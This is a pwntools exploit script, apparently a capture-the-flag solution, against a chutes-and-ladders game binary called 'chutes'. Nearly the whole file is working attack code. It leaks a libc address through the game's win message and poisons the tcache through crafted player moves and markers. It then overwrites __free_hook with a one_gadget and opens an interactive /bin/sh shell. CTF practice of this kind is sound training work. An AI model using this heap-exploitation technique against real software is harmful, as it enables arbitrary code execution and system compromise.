from pwn import *

exe = ELF("./chutes")
context.binary = exe
libc = ELF("./libc.so.6")

context.log_level = 'debug'
#p = remote("mc.ax", 31326)
p = remote("localhost", 31326)
#p = process(['./chutes-patched'])
#p = gdb.debug("./chutes-patched", env={})

current_player_turn = 0
num_players = 0

def setup_game(players, chutes, ladders):
    global num_players, current_player_turn
    num_players = len(players)
    current_player_turn = 0
    
    p.recvuntil(b': ')
    p.sendline(f"{len(players)}".encode())
    for marker in players:
        p.recvuntil(b': ')
        p.sendline(marker)

    # do we want to change chutes and ladders?
    p.recvuntil(b'(y/n): ')
    if chutes and ladders:
        p.sendline(b'y')
        # must supply 5
        for i in range(5):
            p.recvuntil(b"Enter a chute in the format [start][space][end]:")
            start = chutes[i][0]
            end = chutes[i][1]
            p.sendline(f"{start} {end}".encode())
        for i in range(5):
            p.recvuntil(b"Enter a ladder in the format [start][space][end]:")
            start = ladders[i][0]
            end = ladders[i][1]
            p.sendline(f"{start} {end}".encode())
    else:
        print("No chutes/ladders supplied")
        p.sendline(b'n')

    p.recvuntil(b"----- Player 1's turn! -----")

def move_player(player_num, num_forward, new_marker=None):
    global num_players, current_player_turn
    
    while current_player_turn != player_num:
        pass_move()

    return send_move(f"{num_forward}".encode(), new_marker)
        

def send_move(roll, new_marker=None):
    global num_players, current_player_turn
    p.recvuntil(b'Would you like to change your marker? (y/n): ')
    if new_marker:
        p.sendline(b'y')
        p.recvuntil(b'New marker for player')
        p.sendline(new_marker)
    else:
        p.sendline(b'n')
    p.recvuntil(b'(1-6): ')
    p.sendline(roll)
    response = p.recvuntil(b'Would you like to take a look at the board now? (y/n):')
    p.sendline(b'n')

    current_player_turn = (current_player_turn + 1) % num_players
    
    return response

def pass_move():
    global num_players, current_player_turn
    p.recvuntil(b'Would you like to change your marker? (y/n): ')
    p.sendline(b'n')
    p.recvuntil(b'(1-6): ')
    p.sendline(b'0')
    p.recvuntil(b'Would you like to take a look at the board now? (y/n):')
    p.sendline(b'n')
    current_player_turn = (current_player_turn + 1) % num_players

def win():
    winning_moves = [5,6,4,1,6,6,6,6,5,1]
    winning_moves = [str(x).encode() for x in winning_moves]
    setup_game()
    p.recv().decode()
    p.recv().decode()
    for move in winning_moves:
        res = send_move(move)
        if b"won!" in res:
            print(res.decode())
            break
        pass_move()

def main():
    # want to trigger a free on a square then to back there.

    players = [b"A", b"B", b"C", b"D", b"E", b"F", b"\x00", b"\x00", b"\x00", b"\x00"]
    chutes = [(90, 89), (11, 0), (10, 9), (8, 6), (5, 3)]
    ladders = [(20, 31), (2, 10), (1, 99), (7, 8), (4, 5)]
    setup_game(players, chutes, ladders)

    # Win the game
    pass_move()
    response = move_player(0, 1, b"0")

    win_line = response.split(b"\n")[-2]

    puts_addr = int(win_line.split(b" ")[-1], 16)
    print(f"puts: {hex(puts_addr)} {libc.symbols['puts']}")

    libc_base = puts_addr - libc.symbols['puts']
    print(f"libc_base: {hex(libc_base)}")

    free_hook = libc_base + libc.symbols['__free_hook']

    one_gadget = libc_base + 0xe6c81 #0xe6c7e # execve("/bin/sh", r15, r12)
    print(f"one_gadget: {hex(one_gadget)}")
    
    # put player 6 on first loop
    move_player(6, 3)

    # put player 7 on second loop
    move_player(7, 6)

    # loop player 6 to malloc everything in the loop
    move_player(6, 1)
    
    # loop player 7 to malloc everything in the loop
    move_player(7, 1)

    # Free first chunk
    move_player(6, 1)

    # Free second chunk
    move_player(7, 1)

    # now square 6 has is in the tcache and we can overwrite it with &free_hook
    # Then, the second malloc will return &free_hook, which we can then overwrite with one_gadget

    # Important note: We want to get a pointer to free_hook - 4 so that we can just overwrite the lower 6 bytes of free_hook
    free_hook_b = p64(free_hook-4)    
    for i in range(6):
        move_player(i, 6, free_hook_b[i:i+1])


    # Moving 8 forward two should trigger two mallocs because of 2->10->9 chain
    move_player(8, 2)

    # now square 9 has pointer to free_hook

    # Set all the markers of all the players we need
    one_gadget_b = p64(one_gadget)
    for i in range(6):
        move_player(i+4, 0, one_gadget_b[i:i+1])

    # need to move 4--9 there without triggering a free

    move_player(4, 3)
    move_player(5, 3)

    # 0-5 now on 9, still need to get 6 and 7 there, but to do that we need to move player 0 around without triggering a free

    # Move p0 back to 0
    move_player(0, 5)

    # Move p9 to 9
    move_player(9, 6)
    move_player(9, 3)

    # Move p1 to s3
    move_player(1, 5)
    move_player(1, 3)

    # Move p6 to s9
    move_player(6, 6)

    # Move p7 to s9
    move_player(7, 3)

    # move p8 back to s9
    move_player(8, 2)
    move_player(8, 6)
    move_player(8, 3)

    # should be good now, trigger a free

    # LOL we can't call move_player, because the cleanup don't work
    # move_player(0, 1)
    global num_players, current_player_turn
    while current_player_turn != 0:
        pass_move()

    p.recvuntil(b'Would you like to change your marker? (y/n): ')
    p.sendline(b'n')
    p.recvuntil(b'(1-6): ')
    p.sendline(b"1")
    
    p.interactive()

if __name__ == "__main__":
    main()
